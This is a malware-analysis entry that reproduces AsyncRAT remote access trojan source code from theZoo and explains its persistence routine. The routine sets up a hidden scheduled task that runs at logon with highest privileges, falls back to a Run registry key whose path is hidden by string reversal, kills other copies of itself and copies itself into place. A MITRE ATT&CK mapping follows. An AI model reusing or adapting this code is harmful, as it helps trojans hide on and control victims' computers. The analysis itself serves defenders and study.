# AsyncRAT - Privileged Logon Task Persistence

## Metadata
- **Repository**: theZoo-master
- **File Path**: `malware/Source/Original/AsyncRAT/AsyncRAT/AsyncRAT-C-Sharp-0.5.7B/AsyncRAT-C#/Client/Install/NormalStartup.cs`
- **Language**: C#
- **Malware Family**: AsyncRAT (Remote Access Trojan)

## Code Snippet

```csharp
using Client.Helper;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Client.Install
{
    class NormalStartup
    {
        public static void Install()
        {
            try
            {
                FileInfo installPath = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
                string currentProcess = Process.GetCurrentProcess().MainModule.FileName;
                
                if (currentProcess != installPath.FullName) //check if payload is running from installation path
                {
                    foreach (Process P in Process.GetProcesses()) //kill any process which shares same path
                    {
                        try
                        {
                            if (P.MainModule.FileName == installPath.FullName)
                                P.Kill();
                        }
                        catch { }
                    }

                    if (Methods.IsAdmin()) //if payload is running as administrator install schtasks
                    {
                        // *** SCHEDULED TASK CREATION - LINE 37 ***
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd",
                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                        });
                    }
                    else
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
                        {
                            key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name), "\"" + installPath.FullName + "\"");
                        }
                    }

                    FileStream fs;
                    if (File.Exists(installPath.FullName))
                    {
                        File.Delete(installPath.FullName);
                        Thread.Sleep(1000);
                    }
                    fs = new FileStream(installPath.FullName, FileMode.CreateNew);
                    byte[] clientExe = File.ReadAllBytes(currentProcess);
                    fs.Write(clientExe, 0, clientExe.Length);

                    Methods.ClientOnExit();
```

## Analysis

**What it does:**
AsyncRAT is a well-known open-source Remote Access Trojan that implements sophisticated persistence mechanisms. When running with administrator privileges, it creates a scheduled task that executes at user logon with highest privileges. When not elevated, it falls back to registry Run key persistence.

**How it uses Windows Scheduled Tasks (T1053.005):**
- **Schedule**: `/sc onlogon` - triggers when any user logs on
- **Privilege level**: `/rl highest` - runs with highest available privileges (UAC bypass if admin)
- **Task name**: `/tn "[filename]"` - uses the executable name without extension
- **Target**: `/tr '"[fullpath]"'` - points to installation directory path
- **Force**: `/f` - overwrites existing task if present
- **Command execution**: Via `cmd /c ... & exit` - creates task then exits cleanly

**Evasion/Stealth Techniques:**
1. **Privilege-aware branching**: 
   - Admin: Uses scheduled tasks with highest privilege
   - Non-admin: Falls back to HKCU Run key (obfuscated path via `Strings.StrReverse`)
2. **Process cleanup**: Kills any existing instances at installation path before installing
3. **Hidden execution**: `WindowStyle.Hidden` and `CreateNoWindow = true`
4. **String obfuscation**: Registry path reversed: `"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"` → `"Software\Microsoft\Windows\CurrentVersion\Run"`
5. **Dynamic naming**: Task name derived from filename, allowing operators to use benign names
6. **Installation directory**: Copies to configurable `Settings.InstallFolder` location

**Uninstall Capability:**
AsyncRAT also includes task removal functionality (found in separate files):

```csharp
// From Plugin/Options/Options/Handler/HandleUninstall.cs
Arguments = "/c schtasks /delete /f  /tn " + "\"" + Path.GetFileNameWithoutExtension(Application.ExecutablePath) + "\"",
```

**Operational Security:**
- **Clean exit**: Uses `& exit` to ensure cmd.exe terminates after task creation
- **File handling**: Properly deletes old files and waits 1 second before writing new ones
- **Error tolerance**: Try-catch blocks prevent crashes during process enumeration

**AsyncRAT Context:**
AsyncRAT is a popular open-source RAT used by threat actors ranging from script kiddies to sophisticated APT groups. Its persistence mechanism demonstrates:
- Well-designed fallback mechanisms
- Privilege escalation awareness
- Clean code structure making it easy to modify and customize

**MITRE ATT&CK Mapping:**
- **T1053.005**: Scheduled Task/Job: Scheduled Task (Primary when admin)
- **T1547.001**: Boot or Logon Autostart Execution: Registry Run Keys (Fallback)
- **T1548.002**: Abuse Elevation Control Mechanism: Bypass User Account Control (via /rl highest)
- **T1564.003**: Hide Artifacts: Hidden Window
- **T1027**: Obfuscated Files or Information (string reversal)
- **T1070.004**: Indicator Removal on Host: File Deletion (uninstall capability)
